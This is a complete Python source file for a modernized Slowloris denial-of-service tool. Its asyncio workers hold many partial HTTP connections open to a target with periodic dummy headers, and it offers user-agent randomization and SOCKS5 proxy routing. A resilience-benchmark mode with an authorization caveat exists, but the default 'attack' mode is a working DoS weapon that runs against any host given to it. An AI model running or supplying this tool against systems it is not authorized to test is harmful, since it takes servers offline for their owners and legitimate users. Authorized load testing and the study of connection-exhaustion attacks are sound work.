#!/usr/bin/env python3
"""Slowloris - Low bandwidth DoS tool rewritten with modern Python practices.

This implementation uses asyncio for maximum concurrent connection handling,
proper resource management, and clean architecture without monkey-patching.

Features modernized:
- Click for CLI (instead of argparse)
- Structlog for structured logging
- Tenacity for retries
- Enhanced SSL/TLS settings
- Async context managers for connections
- Asyncio-native signal handlers
- Enhanced dataclass with validators
"""

from __future__ import annotations

import asyncio
import json
import logging
import random
import signal
import socket
import ssl
import sys
import time
from dataclasses import asdict, dataclass, replace
from statistics import mean
from typing import TYPE_CHECKING

# Modern CLI package
import click

# Structured logging
import structlog

# Retry logic with tenacity
from tenacity import (
    retry,
    retry_if_exception_type,
    stop_after_attempt,
    wait_exponential,
)

__version__ = "0.4.0"

# Configure structlog with console output
structlog.configure(
    processors=[
        structlog.stdlib.filter_by_level,
        structlog.stdlib.add_logger_name,
        structlog.stdlib.add_log_level,
        structlog.stdlib.PositionalArgumentsFormatter(),
        structlog.processors.TimeStamper(fmt="%d-%m-%Y %H:%M:%S"),
        structlog.processors.StackInfoRenderer(),
        structlog.processors.format_exc_info,
        structlog.processors.UnicodeDecoder(),
        structlog.dev.ConsoleRenderer(),
    ],
    context_class=dict,
    logger_factory=structlog.stdlib.LoggerFactory(),
    cache_logger_on_first_use=True,
    wrapper_class=structlog.stdlib.BoundLogger,
)

log = structlog.get_logger()


# Modern user agents (2026) - Using tuple for immutability
USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",  # noqa: E501
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",  # noqa: E501
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15",  # noqa: E501
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15.7; rv:152.0) Gecko/20100101 Firefox/152.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",  # noqa: E501
    "Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.4078.80",  # noqa: E501
)

# Optional SOCKS5 support
_PROXY_AVAILABLE = False

# Use TYPE_CHECKING to satisfy type checkers without runtime import issues
if TYPE_CHECKING:
    from python_socks import ProxyType
    from python_socks.async_.asyncio import Proxy
else:
    # Runtime: try import, keep as None if unavailable
    Proxy = None  # type: ignore
    ProxyType = None  # type: ignore
    try:
        from python_socks import ProxyType
        from python_socks.async_.asyncio import Proxy

        _PROXY_AVAILABLE = True
    except ImportError:
        pass


# Enhanced Config with validators using dataclass field
@dataclass(frozen=True)
class Config:
    """Configuration for Slowloris attack with validation."""

    host: str
    port: int = 80
    sockets: int = 150
    verbose: bool = False
    randuseragent: bool = False
    useproxy: bool = False
    proxy_host: str = "127.0.0.1"
    proxy_port: int = 8080
    https: bool = False
    sleeptime: float = 15.0
    jitter: float = 3.0
    connect_timeout: float = 10.0

    # Post-initialization validation
    def __post_init__(self) -> None:
        """Validate configuration after initialization."""
        if not self.host:
            raise ValueError("Host cannot be empty")
        if not 1 <= self.port <= 65535:
            raise ValueError(f"Port must be between 1 and 65535, got {self.port}")
        if self.sockets < 1:
            raise ValueError(f"Sockets must be at least 1, got {self.sockets}")
        if self.sleeptime <= 0:
            raise ValueError(f"Sleeptime must be positive, got {self.sleeptime}")
        if self.jitter < 0:
            raise ValueError(f"Jitter must be non-negative, got {self.jitter}")
        if self.connect_timeout <= 0:
            raise ValueError(f"Connect timeout must be positive, got {self.connect_timeout}")

    def to_dict(self) -> dict[str, object]:
        """Convert config to dictionary for serialization."""
        return asdict(self)


def _make_client_ssl_context() -> ssl.SSLContext:
    """Create a client SSL context with modern, permissive TLS settings."""
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
    try:
        ssl_context.set_ciphers(
            "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS"
        )
    except ssl.SSLError:
        # Some systems may not support custom ciphers
        pass
    return ssl_context


class Slowloris:
    """Asyncio-based Slowloris attack engine.

    Manages multiple concurrent connections to exhaust a target server's
    connection pool by sending partial HTTP requests and keeping them alive
    with periodic dummy headers.
    """

    def __init__(self, config: Config) -> None:
        self.config = config
        self._shutdown = asyncio.Event()
        self._tasks: set[asyncio.Task[None]] = set()
        self._ssl: ssl.SSLContext | None = None

        # Enhanced SSL context with TLS 1.3 support
        if config.https:
            self._ssl = self._create_ssl_context()

        # Statistics
        self._connections_created = 0
        self._connections_failed = 0

    def _create_ssl_context(self) -> ssl.SSLContext:
        """Create enhanced SSL context with modern TLS settings."""
        return _make_client_ssl_context()

    @retry(
        stop=stop_after_attempt(3),
        wait=wait_exponential(multiplier=1, min=1, max=10),
        retry=retry_if_exception_type((OSError, ConnectionRefusedError)),
        reraise=True,
    )
    async def _open_connection(self) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        """Establish a connection to the target, optionally via SOCKS5 proxy.

        Uses tenacity for automatic retry with exponential backoff.
        """
        if self.config.useproxy:
            if not _PROXY_AVAILABLE:
                raise RuntimeError(
                    "SOCKS5 proxy support requires 'python-socks' package. "
                    "Install it with: pip install python-socks"
                )
            proxy = Proxy.create(
                proxy_type=ProxyType.SOCKS5,
                host=self.config.proxy_host,
                port=self.config.proxy_port,
            )
            sock = await proxy.connect(
                dest_host=self.config.host,
                dest_port=self.config.port,
                timeout=self.config.connect_timeout,
            )
            return await asyncio.wait_for(
                asyncio.open_connection(sock=sock, ssl=self._ssl),
                timeout=self.config.connect_timeout,
            )

        # Resolve address with IPv6 support (non-blocking DNS on the event loop)
        loop = asyncio.get_running_loop()
        addrinfo = await loop.getaddrinfo(
            self.config.host,
            self.config.port,
            family=socket.AF_UNSPEC,
            type=socket.SOCK_STREAM,
        )

        last_error: Exception | None = None
        for _family, _socktype, _proto, _canonname, sockaddr in addrinfo:
            try:
                host_addr: str = str(sockaddr[0])  # Cast to str for type safety
                return await asyncio.wait_for(
                    asyncio.open_connection(host_addr, self.config.port, ssl=self._ssl),
                    timeout=self.config.connect_timeout,
                )
            except OSError as e:
                last_error = e
                continue

        if last_error:
            raise last_error
        raise OSError(f"Could not connect to {self.config.host}:{self.config.port}")

    def _get_user_agent(self) -> str:
        """Return a user agent string."""
        if self.config.randuseragent:
            return random.choice(USER_AGENTS)
        return USER_AGENTS[0]

    async def _send_initial_request(self, writer: asyncio.StreamWriter) -> None:
        """Send the initial partial HTTP request."""
        query = random.randint(0, 9999)
        lines = [
            f"GET /?{query} HTTP/1.1\r\n",
            f"Host: {self.config.host}\r\n",
            f"User-Agent: {self._get_user_agent()}\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
            "Accept-Language: en-US,en;q=0.5\r\n",
            "Accept-Encoding: gzip, deflate\r\n",
            "Connection: keep-alive\r\n",
        ]
        for line in lines:
            writer.write(line.encode())
        await asyncio.wait_for(writer.drain(), timeout=self.config.connect_timeout)

    async def _worker(self) -> None:
        """Maintain a single Slowloris connection."""
        while not self._shutdown.is_set():
            writer: asyncio.StreamWriter | None = None
            try:
                # Use async context manager for automatic cleanup
                _reader, writer = await self._open_connection()
                self._connections_created += 1
                await self._send_initial_request(writer)

                while not self._shutdown.is_set():
                    # Send keep-alive header
                    if writer and not writer.is_closing():
                        header_val = random.randint(1, 5000)
                        writer.write(f"X-a: {header_val}\r\n".encode())
                        await asyncio.wait_for(writer.drain(), timeout=self.config.connect_timeout)

                    # Calculate sleep time with jitter
                    if self.config.jitter > 0:
                        sleep_time = self.config.sleeptime + random.uniform(
                            -self.config.jitter, self.config.jitter
                        )
                    else:
                        sleep_time = self.config.sleeptime

                    # Wait with early exit on shutdown
                    try:
                        await asyncio.wait_for(self._shutdown.wait(), timeout=sleep_time)
                    except asyncio.TimeoutError:
                        pass  # Normal timeout, continue loop

                    # Check if connection was closed by server
                    if writer and writer.is_closing():
                        break

            except asyncio.TimeoutError:
                self._connections_failed += 1
                log.debug("Connection timeout", host=self.config.host)
            except ConnectionRefusedError:
                self._connections_failed += 1
                log.debug("Connection refused", host=self.config.host)
            except OSError as e:
                self._connections_failed += 1
                log.debug("Connection error", host=self.config.host, error=str(e))
            except RuntimeError as e:
                log.error("Runtime error", error=str(e))
                raise
            except Exception as e:
                log.debug("Unexpected error", error=str(e))
            finally:
                # Use async context manager pattern for proper cleanup
                if writer and not writer.is_closing():
                    writer.close()
                    await writer.wait_closed()

            # Exponential backoff is handled by tenacity decorator
            if not self._shutdown.is_set():
                await asyncio.sleep(1.0)

    async def run(self) -> None:
        """Run the Slowloris attack."""
        log.info(
            "Starting attack",
            host=self.config.host,
            port=self.config.port,
            sockets=self.config.sockets,
        )

        self.start_workers(self.config.sockets)

        # Wait for shutdown signal
        await self._shutdown.wait()

        # Graceful shutdown
        log.info("Shutting down connections")
        await self.stop_and_join()

        log.info(
            "Attack complete",
            connections_created=self._connections_created,
            connections_failed=self._connections_failed,
        )

    def start_workers(self, count: int) -> None:
        """Spawn ``count`` connection-holding worker tasks."""
        for _ in range(count):
            task = asyncio.create_task(self._worker())
            self._tasks.add(task)
            task.add_done_callback(self._tasks.discard)

    async def stop_and_join(self) -> None:
        """Signal shutdown, cancel workers, and wait for them to finish."""
        self.stop()
        for task in list(self._tasks):
            task.cancel()
        if self._tasks:
            await asyncio.gather(*self._tasks, return_exceptions=True)

    @property
    def connections_created(self) -> int:
        """Number of connections successfully opened so far."""
        return self._connections_created

    def stop(self) -> None:
        """Signal shutdown."""
        self._shutdown.set()


async def probe(
    host: str,
    port: int,
    *,
    https: bool = False,
    timeout: float = 10.0,
) -> tuple[bool, float]:
    """Send one legitimate HTTP request and measure responsiveness.

    Returns ``(success, latency_seconds)`` where ``success`` means the server
    returned an HTTP status line before the timeout elapsed.
    """
    ssl_ctx = _make_client_ssl_context() if https else None
    start = time.monotonic()
    writer: asyncio.StreamWriter | None = None
    try:
        reader, conn = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ssl_ctx), timeout=timeout
        )
        writer = conn
        request = (
            f"GET / HTTP/1.1\r\nHost: {host}\r\n"
            "User-Agent: slowloris-benchmark\r\nConnection: close\r\n\r\n"
        )
        conn.write(request.encode())
        await asyncio.wait_for(conn.drain(), timeout=timeout)
        line = await asyncio.wait_for(reader.readline(), timeout=timeout)
        latency = time.monotonic() - start
        return line.startswith(b"HTTP/"), latency
    except (OSError, asyncio.TimeoutError, ssl.SSLError):
        return False, time.monotonic() - start
    finally:
        if writer is not None:
            writer.close()
            try:
                await asyncio.wait_for(writer.wait_closed(), timeout=timeout)
            except (OSError, asyncio.TimeoutError, ssl.SSLError):
                pass


def _summarize_level(level: int, results: list[tuple[bool, float]]) -> dict[str, object]:
    """Aggregate probe results for a single concurrency level."""
    total = len(results)
    successes = sum(1 for ok, _ in results if ok)
    ok_latencies = [latency for ok, latency in results if ok]
    success_rate = successes / total if total else 0.0
    return {
        "sockets": level,
        "probes": total,
        "probe_successes": successes,
        "success_rate": round(success_rate, 4),
        "avg_latency_ms": round(mean(ok_latencies) * 1000, 2) if ok_latencies else None,
        "max_latency_ms": round(max(ok_latencies) * 1000, 2) if ok_latencies else None,
    }


class Benchmark:
    """Resilience benchmark: ramp concurrency and measure server degradation.

    Instead of simply flooding a target, this holds a growing number of
    partial connections at each level while probing the server with legitimate
    requests, recording the level at which the success rate falls below
    ``fail_under``. Intended for testing systems you own or are authorized to
    test.
    """

    def __init__(
        self,
        config: Config,
        levels: list[int],
        *,
        step_duration: float = 5.0,
        probe_interval: float = 0.5,
        warmup: float = 1.0,
        fail_under: float = 0.9,
    ) -> None:
        if not levels:
            raise ValueError("At least one benchmark level is required")
        if any(level < 1 for level in levels):
            raise ValueError("Benchmark levels must be >= 1")
        if not 0.0 <= fail_under <= 1.0:
            raise ValueError("fail_under must be between 0.0 and 1.0")
        self.config = config
        self.levels = levels
        self.step_duration = step_duration
        self.probe_interval = probe_interval
        self.warmup = warmup
        self.fail_under = fail_under

    async def _run_level(self, level: int) -> dict[str, object]:
        engine = Slowloris(replace(self.config, sockets=level))
        engine.start_workers(level)
        try:
            await asyncio.sleep(self.warmup)
            results: list[tuple[bool, float]] = []
            loop = asyncio.get_running_loop()
            deadline = loop.time() + self.step_duration
            while loop.time() < deadline:
                results.append(
                    await probe(
                        self.config.host,
                        self.config.port,
                        https=self.config.https,
                        timeout=self.config.connect_timeout,
                    )
                )
                await asyncio.sleep(self.probe_interval)
        finally:
            await engine.stop_and_join()
        summary = _summarize_level(level, results)
        summary["connections_created"] = engine.connections_created
        return summary

    async def run(self) -> dict[str, object]:
        """Run all levels and return a structured report."""
        levels_report: list[dict[str, object]] = []
        degraded_at: int | None = None
        for level in self.levels:
            log.info("Benchmark level", sockets=level)
            summary = await self._run_level(level)
            levels_report.append(summary)
            success_rate = summary["success_rate"]
            assert isinstance(success_rate, float)
            log.info(
                "Level result",
                sockets=level,
                success_rate=success_rate,
                avg_latency_ms=summary["avg_latency_ms"],
            )
            if degraded_at is None and success_rate < self.fail_under:
                degraded_at = level
        return {
            "target": {
                "host": self.config.host,
                "port": self.config.port,
                "https": self.config.https,
            },
            "fail_under": self.fail_under,
            "levels": levels_report,
            "degraded_at": degraded_at,
        }


def _parse_levels(raw: str) -> list[int]:
    """Parse a comma-separated list of concurrency levels."""
    try:
        levels = [int(part) for part in raw.split(",") if part.strip()]
    except ValueError as exc:
        raise click.BadParameter(f"Invalid levels list: {raw!r}") from exc
    if not levels:
        raise click.BadParameter("At least one level is required")
    if any(level < 1 for level in levels):
        raise click.BadParameter("Levels must be >= 1")
    return levels


async def _run_benchmark(
    config: Config,
    levels: list[int],
    step_duration: float,
    fail_under: float,
    report_path: str | None,
) -> int:
    """Run a resilience benchmark and return a process exit code."""
    benchmark = Benchmark(
        config,
        levels,
        step_duration=step_duration,
        fail_under=fail_under,
    )
    report = await benchmark.run()

    if report_path:
        with open(report_path, "w", encoding="utf-8") as handle:
            json.dump(report, handle, indent=2)
        log.info("Report written", path=report_path)
    else:
        click.echo(json.dumps(report, indent=2))

    degraded_at = report["degraded_at"]
    if degraded_at is not None:
        log.info("Degradation detected", degraded_at=degraded_at)
        return 1
    return 0


async def _run_attack(config: Config) -> None:
    """Set up signal handlers on the running loop and run the attack."""
    slowloris = Slowloris(config)

    def signal_handler() -> None:
        log.info("Received interrupt signal, shutting down")
        slowloris.stop()

    # Register signal handlers on the running loop (asyncio-native)
    loop = asyncio.get_running_loop()
    try:
        loop.add_signal_handler(signal.SIGINT, signal_handler)
        loop.add_signal_handler(signal.SIGTERM, signal_handler)
    except NotImplementedError:
        # Windows doesn't support add_signal_handler
        import signal as sig

        sig.signal(sig.SIGINT, lambda s, f: signal_handler())
        sig.signal(sig.SIGTERM, lambda s, f: signal_handler())

    await slowloris.run()


# Modern CLI using Click instead of argparse
@click.command()
@click.argument("host", required=False)
@click.option(
    "-p",
    "--port",
    default=80,
    type=int,
    help="Port of webserver, usually 80 or 443",
)
@click.option(
    "-s",
    "--sockets",
    default=150,
    type=int,
    help="Number of concurrent connections to maintain",
)
@click.option(
    "-v",
    "--verbose",
    is_flag=True,
    help="Enable verbose logging",
)
@click.option(
    "-ua",
    "--randuseragents",
    is_flag=True,
    help="Randomize user-agent for each connection",
)
@click.option(
    "-x",
    "--useproxy",
    is_flag=True,
    help="Use SOCKS5 proxy for connections",
)
@click.option(
    "--proxy-host",
    default="127.0.0.1",
    help="SOCKS5 proxy host (default: 127.0.0.1)",
)
@click.option(
    "--proxy-port",
    default=8080,
    type=int,
    help="SOCKS5 proxy port (default: 8080)",
)
@click.option(
    "--https",
    is_flag=True,
    help="Use HTTPS for connections",
)
@click.option(
    "--sleeptime",
    default=15,
    type=float,
    help="Seconds between keep-alive headers (default: 15)",
)
@click.option(
    "--jitter",
    default=3,
    type=float,
    help="Random jitter added to sleep time (default: 3)",
)
@click.option(
    "--connect-timeout",
    default=10,
    type=float,
    help="Timeout in seconds for connecting and writing (default: 10)",
)
@click.option(
    "--benchmark",
    is_flag=True,
    help="Resilience benchmark mode: ramp concurrency and report degradation",
)
@click.option(
    "--levels",
    default="10,50,100,200",
    help="Comma-separated concurrency levels for --benchmark (default: 10,50,100,200)",
)
@click.option(
    "--step-duration",
    default=5.0,
    type=float,
    help="Seconds to probe at each benchmark level (default: 5)",
)
@click.option(
    "--fail-under",
    default=0.9,
    type=float,
    help="Probe success-rate threshold for degradation in --benchmark (default: 0.9)",
)
@click.option(
    "--report",
    "report_path",
    default=None,
    type=click.Path(dir_okay=False, writable=True),
    help="Write benchmark report as JSON to this path (default: stdout)",
)
@click.version_option(version=__version__)
def main(
    host: str | None,
    port: int,
    sockets: int,
    verbose: bool,
    randuseragents: bool,
    useproxy: bool,
    proxy_host: str,
    proxy_port: int,
    https: bool,
    sleeptime: float,
    jitter: float,
    connect_timeout: float,
    benchmark: bool,
    levels: str,
    step_duration: float,
    fail_under: float,
    report_path: str | None,
) -> None:
    """Slowloris - Low bandwidth stress test tool for websites."""

    if not host:
        click.echo(click.get_current_context().get_help())
        sys.exit(1)

    # Create config with validation
    try:
        config = Config(
            host=host,
            port=port,
            sockets=sockets,
            verbose=verbose,
            randuseragent=randuseragents,
            useproxy=useproxy,
            proxy_host=proxy_host,
            proxy_port=proxy_port,
            https=https,
            sleeptime=sleeptime,
            jitter=jitter,
            connect_timeout=connect_timeout,
        )
    except ValueError as e:
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)

    logging.basicConfig(format="%(message)s")
    logging.getLogger().setLevel(logging.DEBUG if config.verbose else logging.INFO)

    if config.useproxy and not _PROXY_AVAILABLE:
        click.echo(
            "Error: --useproxy requires the 'python-socks' package. "
            "Install it with: pip install 'slowloris[proxy]'",
            err=True,
        )
        sys.exit(1)

    if benchmark:
        parsed_levels = _parse_levels(levels)
        try:
            exit_code = asyncio.run(
                _run_benchmark(config, parsed_levels, step_duration, fail_under, report_path)
            )
        except KeyboardInterrupt:
            log.info("Interrupted, shutting down")
            exit_code = 130
        sys.exit(exit_code)

    # Run using the modern asyncio.run() entry point
    try:
        asyncio.run(_run_attack(config))
    except KeyboardInterrupt:
        log.info("Interrupted, shutting down")


if __name__ == "__main__":
    main()
